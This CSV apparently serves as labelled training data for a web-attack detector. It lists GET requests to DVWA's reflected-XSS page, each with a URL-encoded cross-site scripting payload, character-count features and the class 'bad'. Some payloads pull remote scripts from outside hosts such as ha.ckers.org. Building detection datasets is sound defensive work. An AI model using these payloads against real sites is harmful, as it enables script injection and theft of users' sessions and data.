method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cform%3E%3Cbutton+formaction%3Djavascript%26colon%3Balert%281%29%3ECLICKME&user_token=5bc81e6eae30376f581714db1081c7f4,,0,0,0,1,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3B&user_token=7b7c5e65ded04f240b518635ed63a568,,0,0,0,0,0,1,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%5C%22XSS%5C%22%29%27%3E&user_token=61694c9d73b206cd36489b5e141ce43d,,2,2,0,1,1,1,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%5Cx3A%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=7e20cf691f48c57f7cbda889fc6a692a,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cmath%3E%3Ca+xlink%3Ahref%3D%22%2F%2Fjsfiddle.net%2Ft846h%2F%22%3Eclick&user_token=579e187747477ae678fdeee2a7a1c8c8,,0,2,0,0,1,1,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E&user_token=6580b55e597c6b2456e4da7d5cc6fc18,,2,2,0,1,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E&user_token=ad5a3d95ca54144b927b57c22b8868a4,,0,0,0,0,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D%60xx%3Axx%60onerror%3Dalert%281%29%3E&user_token=a8d9d64f925c330a541e5c38516123c0,,0,0,0,1,1,3,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CScRipT+5-0*3%2B9%2F3%3D%3Eprompt%281%29%3C%2FScRipT+giveanswerhere%3D%3F&user_token=97b25ff983039c99281fb3f7321d9713,,0,0,0,1,2,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx0Ejavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=b465fb86f7fbb7737b3d11b11beadbfa,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cmeta+content%3D%22%26NewLine%3B+1+%26NewLine%3B%3B+JAVASCRIPT%26colon%3B+alert%281%29%22+http-equiv%3D%22refresh%22%2F%3E&user_token=9498c460dc912e5ec590ee36e83771ee,,0,4,0,1,6,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx1Djavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=fd5e7583d1ca9b58b682f5e1c5c5745a,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%23+onmouseover%3D%22alert%28%27xxs%27%29%22%3E&user_token=855bc85a10b6f0420073d24647322646,,2,2,0,1,2,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cform%3E%3Cbutton+formaction%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3EX&user_token=e9ab2a972143778f6ba777a4a9c5d380,,0,2,0,1,1,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimage+src%3D%22javascript%3Aalert%281%29%22%3E&user_token=d0a032a538ea9fb1fc1113991dda9324,,0,2,0,1,1,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%28A%29%29%3E&user_token=7662a82c23df409cce71ab6ce1996c10,,0,0,0,2,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=perl+-e+%27%3Bprint+%22%3B%26%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%22%3BXSS%22%3B%29%3C%3B%2FSCR%5C0IPT%3E%3B%22%3B%3B%27%3B+%3E%3B+out&user_token=0c862283a5116d6ad13c09f51c2fb2d3,,2,4,0,1,5,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3E%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%26&user_token=e4574fe0ee7514e842ed143986ffa3e8,,0,3,0,1,0,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E&user_token=67c5e79d8b034b4fc5afbb33ada06ab8,,2,4,0,2,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%21%5BCDATA%5B%3Cscript%3Evar+n%3D0%3Bwhile%28true%29%7Bn%2B%2B%3B%7D%3C%2Fscript%3E%5D%5D%3E&user_token=c9624eb2aafa020d496614b874ae121f,,0,0,0,1,1,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%5Cx09type%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E&user_token=8a39e7f8677a90fdeb2a27423a58aa5f,,0,2,0,1,0,8,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx1Bjavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=00f35613d67b0b9d0dbffd9806a20b33,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg%2Fonload%3Dalert%281%29&user_token=8cb19e1fa352b6a565431af278fbba16,,0,0,0,1,0,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CBODY+onload%21%23%24%25%26%28%29*%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E&user_token=ac4fee2218a66890076c42df1b100510,,0,2,0,2,1,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cembed+type%3D%22image%22+src%3D%25%28scriptlet%29s%3E%3C%2Fembed%3E&user_token=3bc2ab5109288c78c6e5b11e93d29995,,0,2,0,1,2,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26%23060&user_token=77e57e49676989b199c1277ccd03cfe0,,0,0,0,0,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cform%3E%3Ciframe+%26%2309%3B%26%2310%3B%26%2311%3B+src%3D%22javascript%26%2358%3Balert%281%29%22%26%2311%3B%26%2310%3B%26%2309%3B%3B%3E&user_token=967d769120a9db4596ccf00f448a0856,,0,2,0,1,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26%230060&user_token=cc5feb01d2f42dba93823eb9dc16ca85,,0,0,0,0,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=http%3A%2F%2Fwww.google%3Cscript+.com%3Ealert%28document.location%29%3C%2Fscript&user_token=08aa0df5abee4cc6f470a3cae4d6cf1f,,0,0,0,1,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg+onResize+svg+onResize%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fsvg+onResize%3E&user_token=f6a3ceaa5afa5711204e46eed8450c86,,0,2,0,1,4,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3B%3C%2Fscr%3C%2Fscript%3Eipt%3E&user_token=f319fa9b4a87e38ec031351afa6db4b4,,2,0,0,1,0,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&user_token=5bf02534731644cdf6172b508cc4cee5,,0,4,0,1,1,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E&user_token=58ac4b657d99742ffac235ae462cd036,,2,2,0,1,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3E%3CBODY+onload%21%23%24%25%26%28%29*%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28XSS%22%29%3E&user_token=4d1ff1815180363ea8e1c205ef8a6d58,,0,1,0,2,1,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx82javascript%3Aalert%281%29%3C%2Fscript%3E&user_token=6588fd4075ed36bbe2b8e5a9179e8e72,,1,0,0,1,0,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3BSCRIPT+a%3D%26quot%3B%26gt%3B%26quot%3B+SRC%3D%26quot%3Bhttp%3A%2F%2Fha.ckers.org%2Fxss.js%26quot%3B%26gt%3B%26lt%3B%2FSCRIPT%26gt%3B&user_token=f173fc3afc5b2cac44a120221dba0601,,0,0,0,0,2,9,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%27%3B%27%3B%3B%21--%22%3B%3C%3BXSS%3E%3B%3D%26%3B%7B%28%29%7D&user_token=9cc41708b42c9e0c7a6d36977429ad4c,,2,1,1,1,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cmeta+content%3D%22%26NewLine%3B+1+%26NewLine%3B%3B+JAVASCRIPT%26colon%3B+alert%281%29%22+http-equiv%3D%22refresh%22%2F%3E&user_token=aa3363a21e46820912ed3c2226257de5,,0,4,0,1,6,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=perl+-e+%27print+%5C%22%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%5C%22XSS%5C%5C%22%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%22%3B%27+%26gt%3B+out&user_token=0c2af1843a25dad98a1f42dce2ac4b89,,2,4,0,1,5,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22data%3Atext%2Fhtml%3Bblabla%2C%26%2360%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2332%26%23115%26%23114%26%2399%26%2361%26%2334%26%23104%26%23116%26%23116%26%23112%26%2358%26%2347%26%2347%26%23115%26%23116%26%23101%26%23114%26%23110%26%23101%26%23102%26%2397%26%23109%26%23105%26%23108%26%23121%26%2346%26%23110%26%23101%26%23116%26%2347%26%23102%26%23111%26%23111%26%2346%26%23106%26%23115%26%2334%26%2362%26%2360%26%2347%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2362%26%238203%22%3EClick+Me%3C%2Fa%3E&user_token=a6211d5b85c2cdc07844d837d23ee202,,0,2,0,0,2,1,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.js%22%3E%3C%2Fscript%3E&user_token=b03f7077016d9f7fada452ead8840261,,0,2,0,0,2,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%5Cx00%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=0411504f58107eb7eb5d6308614febe8,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E&user_token=ecdc52b561eb441629b2acbdca637df4,,2,2,0,1,3,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg+contentScriptType%3Dtext%2Fvbs%3E%3Cscript%3EMsgBox%2B1&user_token=9beacf1a00565b5f83f77f95156abfd6,,0,0,0,0,1,1,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%3BDIV+STYLE%3D%22%3Bbackground-image%3A+url%28%26%3B%231%3Bjavascript%3Aalert%28%27%3BXSS%27%3B%29%29%22%3B%3E%3B&user_token=dbcbb283fb077759a8dc986e37a40445,,2,2,0,2,2,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22javascript%3Aalert%281%29%22%3E&user_token=2dd13c3337b293dd9f56c9fcdb6c65aa,,0,2,0,1,1,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cframeset+onload%3Djavascript%3Ajavascript%3Aalert%281%29%3E%3C%2Fframeset%3E&user_token=43c249d6c31f0f51b12f6a158273e0a1,,0,0,0,1,1,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3Aexp%5Cx00ression%28javascript%3Aalert%281%29%22%3EDEF&user_token=6cf6a6d9d686c909622afcd2e0101080,,0,2,0,2,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cdiv+style%3Dwidth%3A1px%3Bfilter%3Aglow+onfilterchange%3Djavascript%3Aalert%281%29%3Ex&user_token=82fd6789d54e0fef8722654e3abad1d4,,0,0,0,1,2,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cmeta+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&user_token=2224cf4da1835c73c5877c5320693abb,,0,4,0,0,2,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=7e91f77a85d34343192620cbf5cb8a2c,,2,2,0,1,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3BIMG+SRC%3D%5C%22mocha%26%2358%3B%26%2391%3Bcode%26%2393%3B%5C%22%26gt%3B&user_token=12c92af3c3aa615574b4fa35800a1cab,,0,2,0,0,1,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%3BXSS+STYLE%3D%22%3Bxss%3Aexpression%28alert%28%27%3BXSS%27%3B%29%29%22%3B%3E%3B&user_token=388bbcabbd4fa30241f2b900fa0a9797,,2,2,0,2,1,3,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CSTYLE%3Ea%7Bbackground%3Aurl%28%27s1%27+%27s2%29%7D%40import+javascript%3Ajavascript%3Aalert%281%29%3B%27%29%3B%7D%3C%2FSTYLE%3E&user_token=698d06827074ef72b50f5c1706c85e65,,4,0,0,2,2,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%3BIMG+SRC%3D%22%3Bjav%26%23x09%3Bascript%3Aalert%28%27%3BXSS%27%3B%29%3B%22%3B%3E%3B&user_token=dd49f57a285e11811692d2b397f43703,,2,2,0,1,1,3,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%60%27%3E%3Cscript%3E%5Cx00javascript%3Aalert%281%29%3C%2Fscript%3E&user_token=d090c3ab41dfcd3267d1549e707f320c,,1,0,0,1,0,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5CxE2%5Cx80%5Cx80javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=706ddda1751e4bf407635940acea9191,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%27%27%3B%21--%5C%22%26lt%3BXSS%26gt%3B%3D%26%7B%28%29%7D&user_token=2b755f45032b406dd21bd56ec708ef7e,,2,1,1,1,0,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+onerror%5Cx0B%3Djavascript%3Aalert%281%29%3E&user_token=35e531008d4f9985b8551a0ffb5afc40,,1,1,0,1,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=f885790cc0cd05bae1aed1f0c9a984cf,,2,2,0,1,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%252BACIAPgA8-script%252BAD4-alert%2528document.location%2529%252BADw-%252Fscript%252BAD4APAAi-&user_token=825cd7308aedad2fbe5e59d81510b70a,,0,0,0,0,0,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%27%60%3E%3Cp%3E%3Csvg%3E%3Cscript%3Ea%3D%27hello%5Cx27%3Bjavascript%3Aalert%281%29%2F%2F%27%3B%3C%2Fscript%3E%3C%2Fp%3E&user_token=9456a31af199da4226298b003eb4e14d,,3,0,0,1,0,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cembed+code%3D%22http%3A%2F%2Fbusinessinfo.co.uk%2Flabs%2Fxss%2Fxss.swf%22+allowscriptaccess%3Dalways%3E&user_token=813b9c213038f4ebb6317f2829fd5ac9,,0,2,0,0,2,1,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%2FXSS%2F*-*%2FSTYLE%3Dxss%3Ae%2F**%2Fxpression%28alert%28%27XSS%27%29%29%3E&user_token=2ba109581311c05c5e708d779b3796f3,,2,0,0,2,0,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3BDIV+STYLE%3D%26quot%3Bwidth%3A+expression%28alert%28%26apos%3BXSS%26apos%3B%29%29%3B%26quot%3B%26gt%3B&user_token=8869aa7f5d714c3181db89380f7fcc24,,0,0,0,2,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx80javascript%3Aalert%281%29%3C%2Fscript%3E&user_token=7da338ff443cb1928166e7be5167b31e,,1,0,0,1,0,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%5Cx0Ctype%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E&user_token=53c81692922267dfc5d2ebf4ece81c33,,0,2,0,1,0,8,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%3BBASE+HREF%3D%22%3Bjavascript%3Aalert%28%27%3BXSS%27%3B%29%3B%2F%2F%22%3B%3E%3B&user_token=fc0cbed768e9dc74dba45a670dd88e42,,2,2,0,1,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=c9f30862b2f784c338deedd1fbca3b8f,,2,2,0,1,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%5C%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F&user_token=2aeba06fd31f04942f408a84dbaf7920,,2,1,0,1,0,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx17javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=b2409c01440564cde34d591d89971478,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg+onLoad+svg+onLoad%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fsvg+onLoad%3E&user_token=e3917f7a8f7210bac785085cda0b5784,,0,2,0,1,4,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript+charset%3D%22%5Cx22%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E&user_token=7d8deb0bc5d201eb88535ff2bfc68b45,,0,1,0,1,1,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%2F%3E%3Cimg%2Fonerror%3D%5Cx27javascript%3Aalert%281%29%5Cx27src%3Dxxx%3Ax+%2F%3E&user_token=413776628dd49d4846424c2a569fb181,,0,0,0,1,1,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D&user_token=2393442ab57746197364f5046bdfb09d,,2,1,1,1,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3E%3Ch1%3E%3Ciframe+width%3D420%22+height%3D%22315%22+src%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+allowfullscreen%3E%3C%2Fiframe%3E123%3C%2Fh1%3E&user_token=2799537af81b8f692f937432ec35358a,,0,7,0,0,5,1,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%2F%2F+style%3Dx%3Aexpression%5C28javascript%3Aalert%281%29%5C29%3E&user_token=f920ba525930f043d593fdd59f014296,,0,0,0,1,1,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx16javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=4d21c7b37f36bedf21320b5585177532,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3BIMG+SRC%3D%27vbscript%26%23058%3Bmsgbox%28%5C%22XSS%5C%22%29%27%26gt%3B&user_token=9e607eb60ac45efced9129291d1c4189,,2,2,0,1,1,3,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cframeset+onload%3Djavascript%3Aalert%281%29%3E&user_token=31ab93a750782dec0c0eb6a86c8dbcff,,0,0,0,1,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3BBODY+ONLOAD%3Dalert%28%27XSS%27%29%26gt%3B&user_token=144f070f858bc16a2d4f0c0621a95b21,,2,0,0,1,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3BA+HREF%3D%5C%22htt+p%26%2358%3B%2F%2F6+6%26%2346%3B000146%26%2346%3B0x7%26%2346%3B147%2F%5C%22%26gt%3BXSS%26lt%3B%2FA%26gt%3B&user_token=f5dbe962c6c8c30eafa521a412b4f1a0,,0,2,0,0,3,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%3F+echo%28%27%3CSCR%29%27%3Becho%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E&user_token=34f3795c1267560457688039bfccca18,,4,2,0,3,2,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3BBGSOUND+SRC%3D%26quot%3Bjavascript%3Aalert%28%26apos%3BXSS%26apos%3B%29%3B%26quot%3B%26gt%3B&user_token=e79dd0e37d2734550431b5d3d73b8ccb,,0,0,0,1,1,8,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody+onFocus+body+onFocus%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onFocus%3E&user_token=6f31322d4b855b24483b88903528ca42,,0,2,0,1,4,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26%23X000003C&user_token=bba72c54cb0463d1657b0fe31248f22c,,0,0,0,0,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+SRC%3D%22+%26%2314%3B+javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&user_token=d0eeaa5d5617e176e429e99004cd7b7e,,0,2,0,0,3,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cstyle+onreadystatechange%3Djavascript%3Ajavascript%3Aalert%281%29%3B%3E%3C%2Fstyle%3E&user_token=b09c57c7c845ea6a1069ee80c3a57b46,,0,0,0,1,1,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%2F+onerror%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E%3C%2Fimg%3E&user_token=910489fe2731dde7516fc701efd7ddd1,,0,2,0,2,2,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E&user_token=3984ef572a8de2e73ae93b8cad1fd3a8,,2,0,0,0,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Chtml+onMouseUp+html+onMouseUp%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fhtml+onMouseUp%3E&user_token=cc7bc1680a61099198b536f43f85a677,,0,2,0,1,4,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3Dx+oncanplaythrough%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E&user_token=733dce43afae5c010428b86204b8f475,,0,2,0,2,2,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26%2313%3B%3Cblink%2F%26%2313%3B+onmouseover%3Dpr%26%23x6F%3Bmp%26%23116%3B%281%29%3EOnMouseOver+%7BFirefox+%26+Opera%7D&user_token=fb440cfb419647fa693143fda18260f6,,0,0,0,1,4,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Clink+rel%3Dstylesheet+href%3Ddata%3A%2C*%257bx%3Aexpression%28javascript%3Aalert%281%29%29%257d&user_token=6c7b83ab847affe49d41203558ced1e0,,0,0,0,2,2,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx1Cjavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=6a192d4a9a80012231b1fd83e5ecfccb,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D%60xx%3Axx%60onerror%3Dalert%281%29%3E%3Cmeta+http-equiresh%22+content%3D%220%3Bjavascript%26colon%3Balert%281%29%22%2F%3E&user_token=a99011d2b792b8897e5e6d28d904f1f1,,0,3,0,2,3,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3EObject.__noSuchMethod__+%3D+Function%2C%5B%7B%7D%5D%5B0%5D.constructor._%28%27javascript%3Aalert%281%29%27%29%28%29%3C%2Fscript%3E&user_token=85659fa250dad2cd0281a5ef75acb898,,2,0,0,3,2,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26%2313%3B%3Cblink%2F%26%2313%3B+onmouseover%3Dpr%26%23x6F%3Bmp%26%23116%3B%281%29%3EOnMouseOver+%7BFirefox+%26+Opera%7D&user_token=7caa1f82aabbab7913d945b02e57f33a,,0,0,0,1,4,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=exp%2F*%3C%3BXSS+STYLE%3D%27%3Bno%5Cxss%3Anoxss%28%22%3B*%2F%2F*%22%3B%29%3B&user_token=0d66806b986d3b32a48afd1c4ded5160,,1,2,0,1,1,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%5Cx09%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E&user_token=66cbc63c2d44bc21b22a16e4868a5694,,0,2,0,1,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cstyle%2Fonload%3Dprompt%26%2340%3B%27%26%2388%3B%26%2383%3B%26%2383%3B%27%26%2341%3B&user_token=25b92b29194d3589b6551164cbb6e11e,,2,0,0,0,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%2Fsrc%3Ddata%26colon%3Btext%2Fj%5Cu0061v%5Cu0061%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%2C%5Cu0061%256C%2565%2572%2574%28%2FXSS%2F%29%3E%3C%2Fscript&user_token=85c51557f113b33006837be349ca786d,,0,0,0,1,0,3,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22width%3A+expression%28document.vulnerable%3Dtrue%3B%29%3B%22%3E&user_token=2617c0ac2a75439eead45b9acfa39d98,,0,2,0,1,2,1,bad
